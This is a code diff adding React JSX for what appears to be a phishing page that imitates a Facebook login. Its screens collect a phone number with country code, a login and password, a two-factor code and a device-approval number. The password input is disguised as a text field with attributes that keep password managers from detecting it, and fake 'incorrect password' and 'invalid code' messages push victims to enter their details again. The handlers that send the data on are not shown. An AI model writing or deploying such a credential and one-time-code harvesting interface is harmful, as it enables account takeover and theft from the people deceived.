+                                            <option value="+686">+686 (Kiribati)</option>
+                                            <option value="+383">+383 (Kosovo)</option>
+                                            <option value="+965">+965 (Kuwait)</option>
+                                            <option value="+996">+996 (Kyrgyzstan)</option>
+                                            <option value="+856">+856 (Laos)</option>
+                                            <option value="+371">+371 (Latvia)</option>
+                                            <option value="+961">+961 (Lebanon)</option>
+                                            <option value="+266">+266 (Lesotho)</option>
+                                            <option value="+231">+231 (Liberia)</option>
+                                            <option value="+218">+218 (Libya)</option>
+                                            <option value="+423">+423 (Liechtenstein)</option>
+                                            <option value="+370">+370 (Lithuania)</option>
+                                            <option value="+352">+352 (Luxembourg)</option>
+                                            <option value="+853">+853 (Macao SAR China)</option>
+                                            <option value="+261">+261 (Madagascar)</option>
+                                            <option value="+265">+265 (Malawi)</option>
+                                            <option value="+60">+60 (Malaysia)</option>
+                                            <option value="+960">+960 (Maldives)</option>
+                                            <option value="+223">+223 (Mali)</option>
+                                            <option value="+356">+356 (Malta)</option>
+                                            <option value="+692">+692 (Marshall Islands)</option>
+                                            <option value="+596">+596 (Martinique)</option>
+                                            <option value="+222">+222 (Mauritania)</option>
+                                            <option value="+230">+230 (Mauritius)</option>
+                                            <option value="+262">+262 (Mayotte)</option>
+                                            <option value="+52">+52 (Mexico)</option>
+                                            <option value="+691">+691 (Micronesia)</option>
+                                            <option value="+373">+373 (Moldova)</option>
+                                            <option value="+377">+377 (Monaco)</option>
+                                            <option value="+976">+976 (Mongolia)</option>
+                                            <option value="+382">+382 (Montenegro)</option>
+                                            <option value="+1">+1 (Montserrat)</option>
+                                            <option value="+212">+212 (Morocco)</option>
+                                            <option value="+258">+258 (Mozambique)</option>
+                                            <option value="+95">+95 (Myanmar)</option>
+                                            <option value="+264">+264 (Namibia)</option>
+                                            <option value="+674">+674 (Nauru)</option>
+                                            <option value="+977">+977 (Nepal)</option>
+                                            <option value="+31">+31 (Netherlands)</option>
+                                            <option value="+687">+687 (New Caledonia)</option>
+                                            <option value="+64">+64 (New Zealand)</option>
+                                            <option value="+505">+505 (Nicaragua)</option>
+                                            <option value="+227">+227 (Niger)</option>
+                                            <option value="+234">+234 (Nigeria)</option>
+                                            <option value="+683">+683 (Niue)</option>
+                                            <option value="+850">+850 (North Korea)</option>
+                                            <option value="+389">+389 (North Macedonia)</option>
+                                            <option value="+1">+1 (Northern Mariana Islands)</option>
+                                            <option value="+47">+47 (Norway)</option>
+                                            <option value="+968">+968 (Oman)</option>
+                                            <option value="+92">+92 (Pakistan)</option>
+                                            <option value="+680">+680 (Palau)</option>
+                                            <option value="+970">+970 (Palestine)</option>
+                                            <option value="+507">+507 (Panama)</option>
+                                            <option value="+675">+675 (Papua New Guinea)</option>
+                                            <option value="+595">+595 (Paraguay)</option>
+                                            <option value="+51">+51 (Peru)</option>
+                                            <option value="+63">+63 (Philippines)</option>
+                                            <option value="+48">+48 (Poland)</option>
+                                            <option value="+351">+351 (Portugal)</option>
+                                            <option value="+1">+1 (Puerto Rico)</option>
+                                            <option value="+974">+974 (Qatar)</option>
+                                            <option value="+262">+262 (Réunion)</option>
+                                            <option value="+40">+40 (Romania)</option>
+                                            <option value="+7">+7 (Russia)</option>
+                                            <option value="+250">+250 (Rwanda)</option>
+                                            <option value="+590">+590 (Saint Barthélemy)</option>
+                                            <option value="+290">+290 (Saint Helena)</option>
+                                            <option value="+1">+1 (Saint Kitts and Nevis)</option>
+                                            <option value="+1">+1 (Saint Lucia)</option>
+                                            <option value="+590">+590 (Saint Martin)</option>
+                                            <option value="+508">+508 (Saint Pierre and Miquelon)</option>
+                                            <option value="+1">+1 (Saint Vincent and the Grenadines)</option>
+                                            <option value="+685">+685 (Samoa)</option>
+                                            <option value="+378">+378 (San Marino)</option>
+                                            <option value="+239">+239 (São Tomé and Príncipe)</option>
+                                            <option value="+966">+966 (Saudi Arabia)</option>
+                                            <option value="+221">+221 (Senegal)</option>
+                                            <option value="+381">+381 (Serbia)</option>
+                                            <option value="+248">+248 (Seychelles)</option>
+                                            <option value="+232">+232 (Sierra Leone)</option>
+                                            <option value="+65">+65 (Singapore)</option>
+                                            <option value="+1">+1 (Sint Maarten)</option>
+                                            <option value="+421">+421 (Slovakia)</option>
+                                            <option value="+386">+386 (Slovenia)</option>
+                                            <option value="+677">+677 (Solomon Islands)</option>
+                                            <option value="+252">+252 (Somalia)</option>
+                                            <option value="+27">+27 (South Africa)</option>
+                                            <option value="+82">+82 (South Korea)</option>
+                                            <option value="+211">+211 (South Sudan)</option>
+                                            <option value="+34">+34 (Spain)</option>
+                                            <option value="+94">+94 (Sri Lanka)</option>
+                                            <option value="+249">+249 (Sudan)</option>
+                                            <option value="+597">+597 (Suriname)</option>
+                                            <option value="+46">+46 (Sweden)</option>
+                                            <option value="+41">+41 (Switzerland)</option>
+                                            <option value="+963">+963 (Syria)</option>
+                                            <option value="+886">+886 (Taiwan)</option>
+                                            <option value="+992">+992 (Tajikistan)</option>
+                                            <option value="+255">+255 (Tanzania)</option>
+                                            <option value="+66">+66 (Thailand)</option>
+                                            <option value="+670">+670 (Timor-Leste)</option>
+                                            <option value="+228">+228 (Togo)</option>
+                                            <option value="+690">+690 (Tokelau)</option>
+                                            <option value="+676">+676 (Tonga)</option>
+                                            <option value="+1">+1 (Trinidad and Tobago)</option>
+                                            <option value="+216">+216 (Tunisia)</option>
+                                            <option value="+90">+90 (Turkey)</option>
+                                            <option value="+993">+993 (Turkmenistan)</option>
+                                            <option value="+1">+1 (Turks and Caicos Islands)</option>
+                                            <option value="+688">+688 (Tuvalu)</option>
+                                            <option value="+256">+256 (Uganda)</option>
+                                            <option value="+380">+380 (Ukraine)</option>
+                                            <option value="+971">+971 (United Arab Emirates)</option>
+                                            <option value="+44">+44 (United Kingdom)</option>
+                                            <option value="+1">+1 (United States)</option>
+                                            <option value="+598">+598 (Uruguay)</option>
+                                            <option value="+1">+1 (US Virgin Islands)</option>
+                                            <option value="+998">+998 (Uzbekistan)</option>
+                                            <option value="+678">+678 (Vanuatu)</option>
+                                            <option value="+379">+379 (Vatican City)</option>
+                                            <option value="+58">+58 (Venezuela)</option>
+                                            <option value="+84">+84 (Vietnam)</option>
+                                            <option value="+681">+681 (Wallis and Futuna)</option>
+                                            <option value="+212">+212 (Western Sahara)</option>
+                                            <option value="+967">+967 (Yemen)</option>
+                                            <option value="+260">+260 (Zambia)</option>
+                                            <option value="+263">+263 (Zimbabwe)</option>
+                                        </select>
+                                    </div>
+                                    <input className="fb-input" style={{ flex: 1, borderColor: errors.phoneNum ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
+                                </div>
+                                {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
+                            </div>
+                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
+                        </form>
+                      </>
+                    )}
+
+                    {/* FORM 2: LOGIN */}
+                    {step === 2 && (
+                      <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                          <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
+                          <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
+                          {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
+                          <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
+                      </form>
+                    )}
+
+                    {/* FORM 3: 2FA & CHECK DEVICE */}
+                    {step === 3 && (
+                      <>
+                        {matchNumber ? (
+                          // GIAO DIỆN DUYỆT THIẾT BỊ
+                          <>
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px' }}>
+                                Check your other device
+                            </h2>
+                            
+                            <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4' }}>
+                                Open the notification on your other device, then tap <strong>{matchNumber}</strong> to verify it's you.
+                            </p>
+
+                            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
+                                <img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} />
+                            </div>
+
+                            <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>
+                                {matchNumber}
+                            </div>
+                          </>
+                        ) : (
+                          // GIAO DIỆN NHẬP MÃ 2FA
+                          <>
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
+                            
+                            <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
+                                <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
+                            </div>
+
+                            <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
+                            
+                            <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                                <input 
+                                    className="fb-input fb-otp-input" 
+                                    style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
+                                    placeholder="00000000" 
+                                    value={otp} 
+                                    onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
+                                    required 
+                                    maxLength={8} 
+                                />
+                                
+                                {showOtpError && (
+                                    <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
+                                        Invalid security code. Please check the code and try again.
+                                    </div>
+                                )}
+                                
+                                <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
+                                    {loading ? 'Verifying...' : 'Verify'}
+                                </button>
+                            </form>
+                          </>
                         )}
-                        
-                        <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
-                            {loading ? 'Verifying...' : 'Verify'}
-                        </button>
-                    </form>
+                      </>
+                    )}
                   </>
                 )}
 
